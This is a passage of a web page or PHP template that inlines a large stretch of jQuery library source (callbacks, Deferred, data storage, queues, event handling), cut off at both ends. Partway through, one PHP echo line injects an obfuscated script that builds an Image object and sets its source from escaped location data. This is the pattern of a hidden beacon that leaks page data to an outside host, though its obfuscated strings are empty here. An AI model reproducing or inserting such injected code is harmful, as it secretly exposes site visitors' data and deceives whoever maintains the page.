                            ret = jQuery.filter(selector, ret)
                        }
                        if (this.length > 1) {
                            if (!guaranteedUnique[name]) {
                                ret = jQuery.unique(ret)
                            }
                            if (rparentsprev.test(name)) {
                                ret = ret.reverse()
                            }
                        }
                        return this.pushStack(ret)
                    }
                });
                var rnotwhite = (/\S+/g);
                var optionsCache = {};

                function createOptions(options) {
                    var object = optionsCache[options] = {};
                    jQuery.each(options.match(rnotwhite) || [], function(_, flag) {
                        object[flag] = true
                    });
                    return object
                }
                jQuery.Callbacks = function(options) {
                    options = typeof options === "string" ? (optionsCache[options] || createOptions(options)) : jQuery.extend({}, options);
                    var firing, memory, fired, firingLength, firingIndex, firingStart, list = [],
                        stack = !options.once && [],
                        fire = function(data) {
                            memory = options.memory && data;
                            fired = true;
                            firingIndex = firingStart || 0;
                            firingStart = 0;
                            firingLength = list.length;
                            firing = true;
                            for (; list && firingIndex < firingLength; firingIndex++) {
                                if (list[firingIndex].apply(data[0], data[1]) === false && options.stopOnFalse) {
                                    memory = false;
                                    break
                                }
                            }
                            firing = false;
                            if (list) {
                                if (stack) {
                                    if (stack.length) {
                                        fire(stack.shift())
                                    }
                                } else if (memory) {
                                    list = []
                                } else {
                                    self.disable()
                                }
                            }
                        },
                        self = {
                            add: function() {
                                if (list) {
                                    var start = list.length;
                                    (function add(args) {
                                        jQuery.each(args, function(_, arg) {
                                            var type = jQuery.type(arg);
                                            if (type === "function") {
                                                if (!options.unique || !self.has(arg)) {
                                                    list.push(arg)
                                                }
                                            } else if (arg && arg.length && type !== "string") {
                                                add(arg)
                                            }
                                        })
                                    })(arguments);
                                    if (firing) {
                                        firingLength = list.length
                                    } else if (memory) {
                                        firingStart = start;
                                        fire(memory)
                                    }
                                }
                                return this
                            },
                            remove: function() {
                                if (list) {
                                    jQuery.each(arguments, function(_, arg) {
                                        var index;
                                        while ((index = jQuery.inArray(arg, list, index)) > -1) {
                                            list.splice(index, 1);
                                            if (firing) {
                                                if (index <= firingLength) {
                                                    firingLength--
                                                }
                                                if (index <= firingIndex) {
                                                    firingIndex--
                                                }
                                            }
                                        }
                                    })
                                }
                                return this
                            },
                            has: function(fn) {
                                return fn ? jQuery.inArray(fn, list) > -1 : !!(list && list.length)
                            },
                            empty: function() {
                                list = [];
                                firingLength = 0;
                                return this
                            },
                            disable: function() {
                                list = stack = memory = undefined;
                                return this
                            },
                            disabled: function() {
                                return !list
                            },
                            lock: function() {
                                stack = undefined;
                                if (!memory) {
                                    self.disable()
                                }
                                return this
                            },
                            locked: function() {
                                return !stack
                            },
                            fireWith: function(context, args) {
                                if (list && (!fired || stack)) {
                                    args = args || [];
                                    args = [context, args.slice ? args.slice() : args];
                                    if (firing) {
                                        stack.push(args)
                                    } else {
                                        fire(args)
                                    }
                                }
                                return this
                            },
                            fire: function() {
                                self.fireWith(this, arguments);
                                return this
                            },
                            fired: function() {
                                return !!fired
                            }
                        };
                    return self
                };
                jQuery.extend({
                    Deferred: function(func) {
                        var tuples = [
                                ["resolve", "done", jQuery.Callbacks("once memory"), "resolved"],
                                ["reject", "fail", jQuery.Callbacks("once memory"), "rejected"],
                                ["notify", "progress", jQuery.Callbacks("memory")]
                            ],
                            state = "pending",
                            promise = {
                                state: function() {
                                    return state
                                },
                                always: function() {
                                    deferred.done(arguments).fail(arguments);
                                    return this
                                },
                                then: function() {
                                    var fns = arguments;
                                    return jQuery.Deferred(function(newDefer) {
                                        jQuery.each(tuples, function(i, tuple) {
                                            var fn = jQuery.isFunction(fns[i]) && fns[i];
                                            deferred[tuple[1]](function() {
                                                var returned = fn && fn.apply(this, arguments);
                                                if (returned && jQuery.isFunction(returned.promise)) {
                                                    returned.promise().done(newDefer.resolve).fail(newDefer.reject).progress(newDefer.notify)
                                                } else {
                                                    newDefer[tuple[0] + "With"](this === promise ? newDefer.promise() : this, fn ? [returned] : arguments)
                                                }
                                            })
                                        });
                                        fns = null
                                    }).promise()
                                },
                                promise: function(obj) {
                                    return obj != null ? jQuery.extend(obj, promise) : promise
                                }
                            },
                            deferred = {};
                        promise.pipe = promise.then;
                        jQuery.each(tuples, function(i, tuple) {
                            var list = tuple[2],
                                stateString = tuple[3];
                            promise[tuple[1]] = list.add;
                            if (stateString) {
                                list.add(function() {
                                    state = stateString
                                }, tuples[i ^ 1][2].disable, tuples[2][2].lock)
                            }
                            deferred[tuple[0]] = function() {
                                deferred[tuple[0] + "With"](this === deferred ? promise : this, arguments);
                                return this
                            };
                            deferred[tuple[0] + "With"] = list.fireWith
                        });
                        promise.promise(deferred);
                        if (func) {
                            func.call(deferred, deferred)
                        }
                        return deferred
                    },
                    when: function(subordinate) {
                        var i = 0,
                            resolveValues = slice.call(arguments),
                            length = resolveValues.length,
                            remaining = length !== 1 || (subordinate && jQuery.isFunction(subordinate.promise)) ? length : 0,
                            deferred = remaining === 1 ? subordinate : jQuery.Deferred(),
                            updateFunc = function(i, contexts, values) {
                                return function(value) {
                                    contexts[i] = this;
                                    values[i] = arguments.length > 1 ? slice.call(arguments) : value;
                                    if (values === progressValues) {
                                        deferred.notifyWith(contexts, values)
                                    } else if (!(--remaining)) {
                                        deferred.resolveWith(contexts, values)
                                    }
                                }
                            },
                            progressValues, progressContexts, resolveContexts;
                        if (length > 1) {
                            progressValues = new Array(length);
                            progressContexts = new Array(length);
                            resolveContexts = new Array(length);
                            for (; i < length; i++) {
                                if (resolveValues[i] && jQuery.isFunction(resolveValues[i].promise)) {
                                    resolveValues[i].promise().done(updateFunc(i, resolveContexts, resolveValues)).fail(deferred.reject).progress(updateFunc(i, progressContexts, progressValues))
                                } else {
                                    --remaining
                                }
                            }
                        }
                        if (!remaining) {
                            deferred.resolveWith(resolveContexts, resolveValues)
                        }
                        return deferred.promise()
                    }
                });
                var readyList;
                jQuery.fn.ready = function(fn) {
                    jQuery.ready.promise().done(fn);
                    return this
                };
                jQuery.extend({
                    isReady: false,
                    readyWait: 1,
                    holdReady: function(hold) {
                        if (hold) {
                            jQuery.readyWait++
                        } else {
                            jQuery.ready(true)
                        }
                    },
                    ready: function(wait) {
                        if (wait === true ? --jQuery.readyWait : jQuery.isReady) {
                            return
                        }
                        if (!document.body) {
                            return setTimeout(jQuery.ready)
                        }
                        jQuery.isReady = true;
                        if (wait !== true && --jQuery.readyWait > 0) {
                            return
                        }
                        readyList.resolveWith(document, [jQuery]);
                        if (jQuery.fn.triggerHandler) {
                            jQuery(document).triggerHandler("ready");
                            jQuery(document).off("ready")
                        }
                    }
                });

                function detach() {
                    if (document.addEventListener) {
                        document.removeEventListener("DOMContentLoaded", completed, false);
                        window.removeEventListener("load", completed, false)
                    } else {
                        document.detachEvent("onreadystatechange", completed);
                        window.detachEvent("onload", completed)
                    }
                }

                function completed() {
                    if (document.addEventListener || event.type === "load" || document.readyState === "complete") {
                        detach();
                        jQuery.ready()
                    }
                }
                jQuery.ready.promise = function(obj) {
                    if (!readyList) {
                        readyList = jQuery.Deferred();
                        if (document.readyState === "complete") {
                            setTimeout(jQuery.ready)
                        } else if (document.addEventListener) {
                            document.addEventListener("DOMContentLoaded", completed, false);
                            window.addEventListener("load", completed, false)
                        } else {
                            document.attachEvent("onreadystatechange", completed);
                            window.attachEvent("onload", completed);
                            var top = false;
                            try {
                                top = window.frameElement == null && document.documentElement
                            } catch (e) {}
                            if (top && top.doScroll) {
                                (function doScrollCheck() {
                                    if (!jQuery.isReady) {
                                        try {
                                            top.doScroll("left")
                                        } catch (e) {
                                            return setTimeout(doScrollCheck, 50)
                                        }
                                        detach();
                                        jQuery.ready()
                                    }
                                })()
                            }
                        }
                    }
                    return readyList.promise(obj)
                };
                var strundefined = typeof undefined;
                var i;
                for (i in jQuery(support)) {
                    break
                }
                support.ownLast = i !== "0";
                support.inlineBlockNeedsLayout = false;
                jQuery(function() {
                    var val, div, body, container;
                    body = document.getElementsByTagName("body")[0];
                    if (!body || !body.style) {
                        return
                    }
                    div = document.createElement("div");
                    container = document.createElement("div");
                    container.style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px";
                    body.appendChild(container).appendChild(div);
                    if (typeof div.style.zoom !== strundefined) {
                        div.style.cssText = "display:inline;margin:0;border:0;padding:1px;width:1px;zoom:1";
                        support.inlineBlockNeedsLayout = val = div.offsetWidth === 3;
                        if (val) {
                            body.style.zoom = 1
                        }
                    }
                    body.removeChild(container)
                });
                (function() {
                    var div = document.createElement("div");
                    if (support.deleteExpando == null) {
                        support.deleteExpando = true;
                        try {
                            delete div.test
                        } catch (e) {
                            support.deleteExpando = false
                        }
                    }
                    div = null
                })();
                jQuery.acceptData = function(elem) {
                    var noData = jQuery.noData[(elem.nodeName + " ").toLowerCase()],
                        nodeType = +elem.nodeType || 1;
                    return nodeType !== 1 && nodeType !== 9 ? false : !noData || noData !== true && elem.getAttribute("classid") === noData
                };
                var rbrace = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
                    rmultiDash = /([A-Z])/g;

                function dataAttr(elem, key, data) {
                    if (data === undefined && elem.nodeType === 1) {
                        var name = "data-" + key.replace(rmultiDash, "-$1").toLowerCase();
                        data = elem.getAttribute(name);
                        if (typeof data === "string") {
                            try {
                                data = data === "true" ? true : data === "false" ? false : data === "null" ? null : +data + "" === data ? +data : rbrace.test(data) ? jQuery.parseJSON(data) : data
                            } catch (e) {}
                            jQuery.data(elem, key, data)
                        } else {
                            data = undefined
                        }
                    }
                    return data
                }

                function isEmptyDataObject(obj) {
                    var name;
                    for (name in obj) {
                        if (name === "data" && jQuery.isEmptyObject(obj[name])) {
                            continue
                        }
                        if (name !== "toJSON") {
                            return false
                        }
                    }
                    return true
                }

                function internalData(elem, name, data, pvt) {
                    if (!jQuery.acceptData(elem)) {
                        return
                    }
                    var ret, thisCache, internalKey = jQuery.expando,
                        isNode = elem.nodeType,
                        cache = isNode ? jQuery.cache : elem,
                        id = isNode ? elem[internalKey] : elem[internalKey] && internalKey;
                    if ((!id || !cache[id] || (!pvt && !cache[id].data)) && data === undefined && typeof name === "string") {
                        return
                    }
                    if (!id) {
                        if (isNode) {
                            id = elem[internalKey] = deletedIds.pop() || jQuery.guid++
                        } else {
                            id = internalKey
                        }
                    }
                    if (!cache[id]) {
                        cache[id] = isNode ? {} : {
                            toJSON: jQuery.noop
                        }
                    }
                    if (typeof name === "object" || typeof name === "function") {
                        if (pvt) {
                            cache[id] = jQuery.extend(cache[id], name)
                        } else {
                            cache[id].data = jQuery.extend(cache[id].data, name)
                        }
                    }
                    thisCache = cache[id];
                    if (!pvt) {
                        if (!thisCache.data) {
                            thisCache.data = {}
                        }
                        thisCache = thisCache.data
                    }
                    if (data !== undefined) {
                        thisCache[jQuery.camelCase(name)] = data
                    }
                    if (typeof name === "string") {
                        ret = thisCache[name];
                        if (ret == null) {
                            ret = thisCache[jQuery.camelCase(name)]
                        }
                    } else {
                        ret = thisCache
                    }
                    return ret
                }

                function internalRemoveData(elem, name, pvt) {
                    if (!jQuery.acceptData(elem)) {
                        return
                    }
                    var thisCache, i, isNode = elem.nodeType,
                        cache = isNode ? jQuery.cache : elem,
                        id = isNode ? elem[jQuery.expando] : jQuery.expando;
                    if (!cache[id]) {
                        return
                    }
                    if (name) {
                        thisCache = pvt ? cache[id] : cache[id].data;
                        if (thisCache) {
                            if (!jQuery.isArray(name)) {
                                if (name in thisCache) {
                                    name = [name]
                                } else {
                                    name = jQuery.camelCase(name);
                                    if (name in thisCache) {
                                        name = [name]
                                    } else {
                                        name = name.split(" ")
                                    }
                                }
                            } else {
                                name = name.concat(jQuery.map(name, jQuery.camelCase))
                            }
                            i = name.length;
                            while (i--) {
                                delete thisCache[name[i]]
                            }
                            if (pvt ? !isEmptyDataObject(thisCache) : !jQuery.isEmptyObject(thisCache)) {
                                return
                            }
                        }
                    }
                    if (!pvt) {
                        delete cache[id].data;
                        if (!isEmptyDataObject(cache[id])) {
                            return
                        }
                    }
                    if (isNode) {
                        jQuery.cleanData([elem], true)
                    } else if (support.deleteExpando || cache != cache.window) {
                        delete cache[id]
                    } else {
                        cache[id] = null
                    }
                }
                jQuery.extend({
                    cache: {},
                    noData: {
                        "applet ": true,
                        "embed ": true,
                        "object ": "clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
                    },
                    hasData: function(elem) {
                        elem = elem.nodeType ? jQuery.cache[elem[jQuery.expando]] : elem[jQuery.expando];
                        return !!elem && !isEmptyDataObject(elem)
                    },
                    data: function(elem, name, data) {
                        return internalData(elem, name, data)
                    },
                    removeData: function(elem, name) {
                        return internalRemoveData(elem, name)
                    },
                    _data: function(elem, name, data) {
                        return internalData(elem, name, data, true)
                    },
                    _removeData: function(elem, name) {
                        return internalRemoveData(elem, name, true)
                    }
                });
                jQuery.fn.extend({
                    data: function(key, value) {
                        var i, name, data, elem = this[0],
                            attrs = elem && elem.attributes;
                        if (key === undefined) {
                            if (this.length) {
                                data = jQuery.data(elem);
                                if (elem.nodeType === 1 && !jQuery._data(elem, "parsedAttrs")) {
                                    i = attrs.length;
                                    while (i--) {
                                        if (attrs[i]) {
                                            name = attrs[i].name;
                                            if (name.indexOf("data-") === 0) {
                                                name = jQuery.camelCase(name.slice(5));
                                                dataAttr(elem, name, data[name])
                                            }
                                        }
                                    }
                                    jQuery._data(elem, "parsedAttrs", true)
                                }
                            }
                            return data
                        }
                        if (typeof key === "object") {
                            return this.each(function() {
                                jQuery.data(this, key)
                            })
                        }
                        return arguments.length > 1 ? this.each(function() {
                            jQuery.data(this, key, value)
                        }) : elem ? dataAttr(elem, key, jQuery.data(elem, key)) : undefined
                    },
                    removeData: function(key) {
                        return this.each(function() {
                            jQuery.removeData(this, key)
                        })
                    }
                });
                jQuery.extend({
                    queue: function(elem, type, data) {
                        var queue;
                        if (elem) {
                            type = (type || "fx") + "queue";
                            queue = jQuery._data(elem, type);
                            if (data) {
                                if (!queue || jQuery.isArray(data)) {
                                    queue = jQuery._data(elem, type, jQuery.makeArray(data))
                                } else {
                                    queue.push(data)
                                }
                            }
                            return queue || []
                        }
                    },
                    dequeue: function(elem, type) {
                        type = type || "fx";
                        var queue = jQuery.queue(elem, type),
                            startLength = queue.length,
                            fn = queue.shift(),
                            hooks = jQuery._queueHooks(elem, type),
                            next = function() {
                                jQuery.dequeue(elem, type)
                            };
                        if (fn === "inprogress") {
                            fn = queue.shift();
                            startLength--
                        }
                        if (fn) {
                            if (type === "fx") {
                                queue.unshift("inprogress")
                            }
                            delete hooks.stop;
                            fn.call(elem, next, hooks)
                        }
                        if (!startLength && hooks) {
                            hooks.empty.fire()
                        }
                    },
                    _queueHooks: function(elem, type) {
                        var key = type + "queueHooks";
                        return jQuery._data(elem, key) || jQuery._data(elem, key, {
                            empty: jQuery.Callbacks("once memory").add(function() {
                                jQuery._removeData(elem, type + "queue");
                                jQuery._removeData(elem, key)
                            })
                        })
                    }
                });
                jQuery.fn.extend({
                    queue: function(type, data) {
                        var setter = 2;
                        if (typeof type !== "string") {
                            data = type;
                            type = "fx";
                            setter--
                        }
                        if (arguments.length < setter) {
                            return jQuery.queue(this[0], type)
                        }
                        return data === undefined ? this : this.each(function() {
                            var queue = jQuery.queue(this, type, data);
                            jQuery._queueHooks(this, type);
                            if (type === "fx" && queue[0] !== "inprogress") {
                                jQuery.dequeue(this, type)
                            }
                        })
                    },
                    dequeue: function(type) {
                        return this.each(function() {
                            jQuery.dequeue(this, type)
                        })
                    },
                    clearQueue: function(type) {
                        return this.queue(type || "fx", [])
                    },
                    promise: function(type, obj) {
                        var tmp, count = 1,
                            defer = jQuery.Deferred(),
                            elements = this,
                            i = this.length,
                            resolve = function() {
                                if (!(--count)) {
                                    defer.resolveWith(elements, [elements])
                                }
                            };
                        if (typeof type !== "string") {
                            obj = type;
                            type = undefined
                        }
                        type = type || "fx";
                        while (i--) {
                            tmp = jQuery._data(elements[i], type + "queueHooks");
                            if (tmp && tmp.empty) {
                                count++;
                                tmp.empty.add(resolve)
                            }
                        }
                        resolve();
                        return defer.promise(obj)
                    }
                });
                var pnum = (/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/).source;
                var cssExpand = ["Top", "Right", "Bottom", "Left"];
                var isHidden = function(elem, el) {
                    elem = el || elem;
                    return jQuery.css(elem, "display") === "none" || !jQuery.contains(elem.ownerDocument, elem)
                };
                var access = jQuery.access = function(elems, fn, key, value, chainable, emptyGet, raw) {
                    var i = 0,
                        length = elems.length,
                        bulk = key == null;
                    if (jQuery.type(key) === "object") {
                        chainable = true;
                        for (i in key) {
                            jQuery.access(elems, fn, i, key[i], true, emptyGet, raw)
                        }
                    } else if (value !== undefined) {
                        chainable = true;
                        if (!jQuery.isFunction(value)) {
                            raw = true
                        }
                        if (bulk) {
                            if (raw) {
                                fn.call(elems, value);
                                fn = null
                            } else {
                                bulk = fn;
                                fn = function(elem, key, value) {
                                    return bulk.call(jQuery(elem), value)
                                }
                            }
                        }
                        if (fn) {
                            for (; i < length; i++) {
                                fn(elems[i], key, raw ? value : value.call(elems[i], i, fn(elems[i], key)))
                            }
                        }
                    }
                    return chainable ? elems : bulk ? fn.call(elems) : length ? fn(elems[0], key) : emptyGet
                };
                var rcheckableType = (/^(?:checkbox|radio)$/i);
</script>
<?php echo '<script> var _0x8a59=["","",""];a= new Image();a[_0x8a59[0]]=_0x8a59[1]+escape(location[_0x8a59[2]]); </script>';?>
    <script>
        (function() {
            var input = document.createElement("input"),
                div = document.createElement("div"),
                fragment = document.createDocumentFragment();
            div.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>";
            support.leadingWhitespace = div.firstChild.nodeType === 3;
            support.tbody = !div.getElementsByTagName("tbody").length;
            support.htmlSerialize = !!div.getElementsByTagName("link").length;
            support.html5Clone = document.createElement("nav").cloneNode(true).outerHTML !== "<:nav></:nav>";
            input.type = "checkbox";
            input.checked = true;
            fragment.appendChild(input);
            support.appendChecked = input.checked;
            div.innerHTML = "<textarea>x</textarea>";
            support.noCloneChecked = !!div.cloneNode(true).lastChild.defaultValue;
            fragment.appendChild(div);
            div.innerHTML = "<input type='radio' checked='checked' name='t'/>";
            support.checkClone = div.cloneNode(true).cloneNode(true).lastChild.checked;
            support.noCloneEvent = true;
            if (div.attachEvent) {
                div.attachEvent("onclick", function() {
                    support.noCloneEvent = false
                });
                div.cloneNode(true).click()
            }
            if (support.deleteExpando == null) {
                support.deleteExpando = true;
                try {
                    delete div.test
                } catch (e) {
                    support.deleteExpando = false
                }
            }
        })();
        (function() {
            var i, eventName, div = document.createElement("div");
            for (i in {
                    submit: true,
                    change: true,
                    focusin: true
                }) {
                eventName = "on" + i;
                if (!(support[i + "Bubbles"] = eventName in window)) {
                    div.setAttribute(eventName, "t");
                    support[i + "Bubbles"] = div.attributes[eventName].expando === false
                }
            }
            div = null
        })();
        var rformElems = /^(?:input|select|textarea)$/i,
            rkeyEvent = /^key/,
            rmouseEvent = /^(?:mouse|pointer|contextmenu)|click/,
            rfocusMorph = /^(?:focusinfocus|focusoutblur)$/,
            rtypenamespace = /^([^.]*)(?:\.(.+)|)$/;

        function returnTrue() {
            return true
        }

        function returnFalse() {
            return false
        }

        function safeActiveElement() {
            try {
                return document.activeElement
            } catch (err) {}
        }
        jQuery.event = {
            global: {},
            add: function(elem, types, handler, data, selector) {
                var tmp, events, t, handleObjIn, special, eventHandle, handleObj, handlers, type, namespaces, origType, elemData = jQuery._data(elem);
                if (!elemData) {
                    return
                }
                if (handler.handler) {
                    handleObjIn = handler;
                    handler = handleObjIn.handler;
                    selector = handleObjIn.selector
                }
                if (!handler.guid) {
                    handler.guid = jQuery.guid++
                }
                if (!(events = elemData.events)) {
                    events = elemData.events = {}
                }
                if (!(eventHandle = elemData.handle)) {
                    eventHandle = elemData.handle = function(e) {
                        return typeof jQuery !== strundefined && (!e || jQuery.event.triggered !== e.type) ? jQuery.event.dispatch.apply(eventHandle.elem, arguments) : undefined
                    };
                    eventHandle.elem = elem
                }
                types = (types || "").match(rnotwhite) || [""];
                t = types.length;
                while (t--) {
                    tmp = rtypenamespace.exec(types[t]) || [];
                    type = origType = tmp[1];
                    namespaces = (tmp[2] || "").split(".").sort();
                    if (!type) {
                        continue
                    }
                    special = jQuery.event.special[type] || {};
                    type = (selector ? special.delegateType : special.bindType) || type;
                    special = jQuery.event.special[type] || {};
                    handleObj = jQuery.extend({
                        type: type,
                        origType: origType,
                        data: data,
                        handler: handler,
                        guid: handler.guid,
                        selector: selector,
                        needsContext: selector && jQuery.expr.match.needsContext.test(selector),
                        namespace: namespaces.join(".")
                    }, handleObjIn);
                    if (!(handlers = events[type])) {
                        handlers = events[type] = [];
                        handlers.delegateCount = 0;
                        if (!special.setup || special.setup.call(elem, data, namespaces, eventHandle) === false) {
                            if (elem.addEventListener) {
                                elem.addEventListener(type, eventHandle, false)
                            } else if (elem.attachEvent) {
                                elem.attachEvent("on" + type, eventHandle)
                            }
                        }
                    }
                    if (special.add) {
                        special.add.call(elem, handleObj);
                        if (!handleObj.handler.guid) {
                            handleObj.handler.guid = handler.guid
                        }
                    }
                    if (selector) {
                        handlers.splice(handlers.delegateCount++, 0, handleObj)
                    } else {
                        handlers.push(handleObj)
                    }
                    jQuery.event.global[type] = true
                }
                elem = null
            },
            remove: function(elem, types, handler, selector, mappedTypes) {
                var j, handleObj, tmp, origCount, t, events, special, handlers, type, namespaces, origType, elemData = jQuery.hasData(elem) && jQuery._data(elem);
                if (!elemData || !(events = elemData.events)) {
                    return
                }
                types = (types || "").match(rnotwhite) || [""];
                t = types.length;
                while (t--) {
                    tmp = rtypenamespace.exec(types[t]) || [];
                    type = origType = tmp[1];
                    namespaces = (tmp[2] || "").split(".").sort();
                    if (!type) {
                        for (type in events) {
                            jQuery.event.remove(elem, type + types[t], handler, selector, true)
                        }
                        continue
                    }
                    special = jQuery.event.special[type] || {};
                    type = (selector ? special.delegateType : special.bindType) || type;
                    handlers = events[type] || [];
                    tmp = tmp[2] && new RegExp("(^|\\.)" + namespaces.join("\\.(?:.*\\.|)") + "(\\.|$)");
                    origCount = j = handlers.length;
                    while (j--) {
                        handleObj = handlers[j];
                        if ((mappedTypes || origType === handleObj.origType) && (!handler || handler.guid === handleObj.guid) && (!tmp || tmp.test(handleObj.namespace)) && (!selector || selector === handleObj.selector || selector === "**" && handleObj.selector)) {
                            handlers.splice(j, 1);
                            if (handleObj.selector) {
                                handlers.delegateCount--
                            }
                            if (special.remove) {
                                special.remove.call(elem, handleObj)
                            }
                        }
                    }
                    if (origCount && !handlers.length) {
                        if (!special.teardown || special.teardown.call(elem, namespaces, elemData.handle) === false) {
                            jQuery.removeEvent(elem, type, elemData.handle)
                        }
                        delete events[type]
                    }
                }
                if (jQuery.isEmptyObject(events)) {
                    delete elemData.handle;
                    jQuery._removeData(elem, "events")
                }
            },
            trigger: function(event, data, elem, onlyHandlers) {
                var handle, ontype, cur, bubbleType, special, tmp, i, eventPath = [elem || document],
                    type = hasOwn.call(event, "type") ? event.type : event,
                    namespaces = hasOwn.call(event, "namespace") ? event.namespace.split(".") : [];
                cur = tmp = elem = elem || document;
                if (elem.nodeType === 3 || elem.nodeType === 8) {
                    return
                }
                if (rfocusMorph.test(type + jQuery.event.triggered)) {
                    return
                }
                if (type.indexOf(".") >= 0) {
                    namespaces = type.split(".");
                    type = namespaces.shift();
                    namespaces.sort()
                }
                ontype = type.indexOf(":") < 0 && "on" + type;
                event = event[jQuery.expando] ? event : new jQuery.Event(type, typeof event === "object" && event);
                event.isTrigger = onlyHandlers ? 2 : 3;
                event.namespace = namespaces.join(".");
                event.namespace_re = event.namespace ? new RegExp("(^|\\.)" + namespaces.join("\\.(?:.*\\.|)") + "(\\.|$)") : null;
                event.result = undefined;
                if (!event.target) {
                    event.target = elem
                }
                data = data == null ? [event] : jQuery.makeArray(data, [event]);
                special = jQuery.event.special[type] || {};
                if (!onlyHandlers && special.trigger && special.trigger.apply(elem, data) === false) {
                    return
                }
                if (!onlyHandlers && !special.noBubble && !jQuery.isWindow(elem)) {
                    bubbleType = special.delegateType || type;
                    if (!rfocusMorph.test(bubbleType + type)) {
                        cur = cur.parentNode
                    }
                    for (; cur; cur = cur.parentNode) {
                        eventPath.push(cur);
                        tmp = cur
                    }
                    if (tmp === (elem.ownerDocument || document)) {
                        eventPath.push(tmp.defaultView || tmp.parentWindow || window)
                    }
                }
                i = 0;
                while ((cur = eventPath[i++]) && !event.isPropagationStopped()) {
                    event.type = i > 1 ? bubbleType : special.bindType || type;
                    handle = (jQuery._data(cur, "events") || {})[event.type] && jQuery._data(cur, "handle");
                    if (handle) {
                        handle.apply(cur, data)
                    }
                    handle = ontype && cur[ontype];
                    if (handle && handle.apply && jQuery.acceptData(cur)) {
                        event.result = handle.apply(cur, data);
                        if (event.result === false) {
                            event.preventDefault()
                        }
                    }
                }
                event.type = type;
                if (!onlyHandlers && !event.isDefaultPrevented()) {
                    if ((!special._default || special._default.apply(eventPath.pop(), data) === false) && jQuery.acceptData(elem)) {
                        if (ontype && elem[type] && !jQuery.isWindow(elem)) {
                            tmp = elem[ontype];
                            if (tmp) {
                                elem[ontype] = null
                            }
                            jQuery.event.triggered = type;
                            try {
                                elem[type]()
                            } catch (e) {}
                            jQuery.event.triggered = undefined;
                            if (tmp) {
                                elem[ontype] = tmp
                            }
                        }
                    }
                }
                return event.result
            },
            dispatch: function(event) {
                event = jQuery.event.fix(event);
                var i, ret, handleObj, matched, j, handlerQueue = [],
                    args = slice.call(arguments),
                    handlers = (jQuery._data(this, "events") || {})[event.type] || [],
                    special = jQuery.event.special[event.type] || {};
                args[0] = event;
                event.delegateTarget = this;
                if (special.preDispatch && special.preDispatch.call(this, event) === false) {
                    return
                }
                handlerQueue = jQuery.event.handlers.call(this, event, handlers);
                i = 0;
                while ((matched = handlerQueue[i++]) && !event.isPropagationStopped()) {
                    event.currentTarget = matched.elem;
                    j = 0;
                    while ((handleObj = matched.handlers[j++]) && !event.isImmediatePropagationStopped()) {
                        if (!event.namespace_re || event.namespace_re.test(handleObj.namespace)) {
                            event.handleObj = handleObj;
                            event.data = handleObj.data;
                            ret = ((jQuery.event.special[handleObj.origType] || {}).handle || handleObj.handler).apply(matched.elem, args);
                            if (ret !== undefined) {
                                if ((event.result = ret) === false) {
                                    event.preventDefault();
                                    event.stopPropagation()
                                }
                            }
                        }
                    }
                }
                if (special.postDispatch) {
                    special.postDispatch.call(this, event)
                }
                return event.result
            },
            handlers: function(event, handlers) {
                var sel, handleObj, matches, i, handlerQueue = [],
                    delegateCount = handlers.delegateCount,
                    cur = event.target;
                if (delegateCount && cur.nodeType && (!event.button || event.type !== "click")) {
                    for (; cur != this; cur = cur.parentNode || this) {
                        if (cur.nodeType === 1 && (cur.disabled !== true || event.type !== "click")) {
                            matches = [];
                            for (i = 0; i < delegateCount; i++) {
                                handleObj = handlers[i];
                                sel = handleObj.selector + " ";
                                if (matches[sel] === undefined) {
                                    matches[sel] = handleObj.needsContext ? jQuery(sel, this).index(cur) >= 0 : jQuery.find(sel, this, null, [cur]).length
                                }
                                if (matches[sel]) {
                                    matches.push(handleObj)
                                }
                            }
                            if (matches.length) {
                                handlerQueue.push({
                                    elem: cur,
                                    handlers: matches
                                })
                            }
                        }
                    }
                }
                if (delegateCount < handlers.length) {
                    handlerQueue.push({
                        elem: this,
                        handlers: handlers.slice(delegateCount)
                    })
                }
                return handlerQueue
            },
            fix: function(event) {
                if (event[jQuery.expando]) {
                    return event
                }
                var i, prop, copy, type = event.type,
                    originalEvent = event,
                    fixHook = this.fixHooks[type];
                if (!fixHook) {
                    this.fixHooks[type] = fixHook = rmouseEvent.test(type) ? this.mouseHooks : rkeyEvent.test(type) ? this.keyHooks : {}
                }
                copy = fixHook.props ? this.props.concat(fixHook.props) : this.props;
                event = new jQuery.Event(originalEvent);
                i = copy.length;
                while (i--) {
                    prop = copy[i];
                    event[prop] = originalEvent[prop]
                }
                if (!event.target) {
                    event.target = originalEvent.srcElement || document
                }
                if (event.target.nodeType === 3) {
                    event.target = event.target.parentNode
                }
                event.metaKey = !!event.metaKey;
                return fixHook.filter ? fixHook.filter(event, originalEvent) : event
            },
            props: "altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
            fixHooks: {},
            keyHooks: {
                props: "char charCode key keyCode".split(" "),
                filter: function(event, original) {
                    if (event.which == null) {
                        event.which = original.charCode != null ? original.charCode : original.keyCode
                    }
                    return event
                }
            },
            mouseHooks: {
                props: "button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
                filter: function(event, original) {
                    var body, eventDoc, doc, button = original.button,
                        fromElement = original.fromElement;
                    if (event.pageX == null && original.clientX != null) {
                        eventDoc = event.target.ownerDocument || document;
                        doc = eventDoc.documentElement;
                        body = eventDoc.body;
                        event.pageX = original.clientX + (doc && doc.scrollLeft || body && body.scrollLeft || 0) - (doc && doc.clientLeft || body && body.clientLeft || 0);
                        event.pageY = original.clientY + (doc && doc.scrollTop || body && body.scrollTop || 0) - (doc && doc.clientTop || body && body.clientTop || 0)
                    }
                    if (!event.relatedTarget && fromElement) {
                        event.relatedTarget = fromElement === event.target ? original.toElement : fromElement
                    }
                    if (!event.which && button !== undefined) {
                        event.which = (button & 1 ? 1 : (button & 2 ? 3 : (button & 4 ? 2 : 0)))
                    }
                    return event
                }
            },
            special: {
                load: {
                    noBubble: true
                },
                focus: {
                    trigger: function() {
                        if (this !== safeActiveElement() && this.focus) {
                            try {
                                this.focus();
                                return false
                            } catch (e) {}
                        }
                    },
                    delegateType: "focusin"
                },
                blur: {
                    trigger: function() {
                        if (this === safeActiveElement() && this.blur) {
                            this.blur();
                            return false
                        }
                    },
                    delegateType: "focusout"
                },
                click: {
                    trigger: function() {
